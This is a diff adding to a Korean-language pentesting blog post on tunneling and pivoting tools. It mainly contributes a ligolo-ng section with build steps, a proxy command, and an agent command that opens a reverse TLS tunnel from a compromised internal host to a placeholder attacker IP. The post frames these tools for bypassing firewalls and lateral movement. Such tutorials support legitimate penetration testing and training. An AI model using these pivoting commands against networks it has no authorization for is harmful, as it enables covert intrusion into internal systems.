@@ -1,10 +1,10 @@
 ---
 title:  "Tunneling Tools"
-excerpt: "터널링 관련 도구들에 대해 알아보자."
+excerpt: "Chisel, hoaxshell, ligolo-ng 도구들에 대해 알아보자."
 
 categories: pnt
 tags:
-  - [pivoting, tunneling, penetrate, penetration, 'post-exploit', 'port fowarding', hoaxshell, chisel]
+  - [pivoting, tunneling, penetrate, penetration, 'post-exploit', 'port fowarding', hoaxshell, chisel, 'ligolo-ng']
 
 typora-root-url: ../../
  
@@ -39,7 +39,7 @@ Chisel의 핵심은 **TCP/UDP 터널을 구축**하고, **터널 속 트래픽�
 - 내부망의 특정 포트나 서비스를 외부 공격자가 접근하도록 터널 생성
 - SSH 트래픽이 방화벽에 막혀 직접 접속 불가한 환경에서 우회 통신 통로 확보
 - 페이로드 실행 후 안전한 리버스 터널을 만들어 내부망에서 다른 시스템으로 lateral movement 수행
-- 작전 보안을 위해 HTTP 트래픽처럼 보여야 할 때
+- 작전 보안을 위해 HTTP 트래픽처럼 위장해야 할 때
 
 
 > 칼리 리눅스에서는 보통 공격자의 서버 역할을 하고, 내부망에 침투한 호스트에 클라이언트를 설치해 리버스 터널을 만드는 방식으로 사용한다. 방화벽/네트워크 정책 우회에도 매우 유용하다
@@ -287,9 +287,144 @@ sudo python3 hoaxshell.py -lt
 
 ## Ligolo-ng
 
+Ligolo-ng는 리버스 TCP/TLS 터널과 가상 네트워크 인터페이스를 결합한 강력한 피버팅 툴이다. 주로 리버스 TCP/TLS 연결을 통해 내부 네트워크에 접근할 수 있도록 해준다. **SOCKS 프록시 대신 TUN 인터페이스를 사용해 더 효율적이고 쉽게 터널을 구성**할 수 있다. Ligolo-ng는 내부망에 투명하고 안전하게 접근하면서 방화벽, NAT를 손쉽게 우회할 수 있다.
+
+***
+
+### Ligolo-ng 개요
+
+- **SOCKS 프록시 불필요, TUN 인터페이스 사용**
+- ICMP, UDP, SYN Stealth 스캔, OS 탐지, DNS등 여러 프로토콜을 지원
+- **최대 100Mbps의 빠른 속도**를 보여주기 때문에 실무에서도 많이 사용되는 툴
+- TLS 암호화를 통한 안전한 통신
+- 고성능 멀티플렉싱 지원으로 다중 세션 처리 가능
+- 다중 피벗팅 경로를 간편하고 안정적으로 구축 가능
+- 여러 운영체제 지원 (Linux, Windows, macOS)
+- **낮은 권한으로도 사용 가능(사용자 공간 네트워크 스택 이용)**
+- 자동 인증서 설정(Let's Encrypt) 지원
+
+***
+
+### Ligolo-ng 작동 원리
+
+1. **에이전트(Agent):** 침투한 내부 시스템에 설치되어 역방향 TCP/TLS 연결을 서버(Proxy)로 수립  
+2. **프록시 서버(Proxy):** 공격자 측에서 리버스 터널을 열어 에이전트와 통신하며 TUN 인터페이스 생성  
+3. **가상 네트워크 인터페이스:** 프록시 서버에 가상 인터페이스를 만들어 내부망 패킷을 처리하고, 에이전트가 내부 네트워크로 트래픽을 전달  
+4. 이를 통해 공격자는 마치 내부 네트워크에 물리적 접속한 것처럼 다양한 툴로 탐색 및 공격 가능  
+
+***
+
+###  Ligolo 사용 단계
+- proxy (proxy.exe): Ligolo를 사용할 공격자 머신에서 실행할 Ligolo 서버
+- agent (agent.exe): 공격자 머신(proxy 실행중인 머신)에서 터널을 구축한 뒤 프록시로 사용될 머신에서 사용할 에이전트 파일
+
+Ligolo의 사용 단계:
+
+1. (공격자 머신) proxy 로 ligolo 서버 실행 
+2. (피벗할 머신) agent 업로드
+3. (피벗할 머신) agent 실행, 공격자 머신의 ligolo 서버와 터널 구축 
+4. (공격자 머신) 터널 session 접속. 이후 autoroute 명령어를 통해 새로운 NIC과 사용할 route 설정
+5. (공격자 머신) autoroute가 끝났다면, 4번에서 지정한 route/네트워크에 평범하게 접근하면 끝 
 
 
+### Ligolo-ng 설치 및 사용법 요약
 
+#### 1. 다운로드 및 설치
+
+- GitHub repo : https://github.com/nicocha30/ligolo-ng
+
+```bash
+sudo apt update -y ; sudo apt install golang-go -y 
+cd /opt
+git clone https://github.com/nicocha30/ligolo-ng
+go build -o agent cmd/agent/main.go
+go build -o proxy cmd/proxy/main.go
+
+# 윈도우에서 사용할 경우 GOOS를 windows로 설정후 exe로 빌드
+GOOS=windows go build -o agent.exe cmd/agent/main.go
+GOOS=windows go build -o proxy.exe cmd/proxy/main.go
+```
+
+***
+
+#### 2. 프록시 서버 실행 (공격자 측)
+
+```bash
+# proxy 서버를 실행할때는 반드시 sudo 권한으로 실행
+sudo ./proxy -selfcert
+```
+
+- 자동으로 자체 서명된 인증서를 생성하여 TLS로 통신
+- 프록시는 공격자의 터널링 노드 역할
+
+***
+
+#### 3. 에이전트 실행 (내부 침투 호스트)
+
+```bash
+./agent -connect <공격자_IP>:11601 -ignore-cert
+```
+
+- 공격자 서버에 리버스 연결을 수립
+- `-ignore-cert` 옵션은 TLS 인증서 무시(테스트/내부 네트워크용)
+
+***
+
+#### 4. 터널 관리
+
+- 프록시 터미널에서 연결된 세션 확인:
+
+```bash
+session
+```
+
+- 특정 세션 선택 후 라우팅 인터페이스 생성:
+
+```bash
+autoroute
+
+# 라우팅 하고 싶은 호스트 아이피 선택(스페이스바)후 엔터 누르기
+```
+
+- 활성화된 인터페이스 확인:
+
+```bash
+iflist
+```
+
+- 인터페이스 삭제:
+
+```bash
+ifdel --name <인터페이스명>
+```
+
+***
+
+#### 5. 라우팅 설정 예시 (Linux 공격자 머신에서 내부 네트워크 접근용)
+
+```bash
+sudo ip route add 192.168.110.0/24 dev ligolo
+```
+
+- 위 명령으로 내부망 서브넷 트래픽을 ligolo 인터페이스로 라우팅
+***
+
+#### 6. 클린업
+```bash
+# 첫번째, 두번째 피버팅용 NIC 2개 모두 삭제 
+
+# iflist 로 먼저 autoroute로 생성한 NIC 이름 확인 
+ligolo-ng » iflist
+
+# NIC 2개 모두 삭제 
+ligolo-ng » ifdel --name selectartiee  
+INFO[0012] Interface destroyed.                         
+
+# 칼리 리눅스의 route 정상화 확인 
+└─$ sudo ip route list | grep 10.1.
+10.1.0.0/16 via 10.8.0.1 dev tun0 
+10.1.10.0/24 via 10.8.0.1 dev tun0
+```
 
 
 
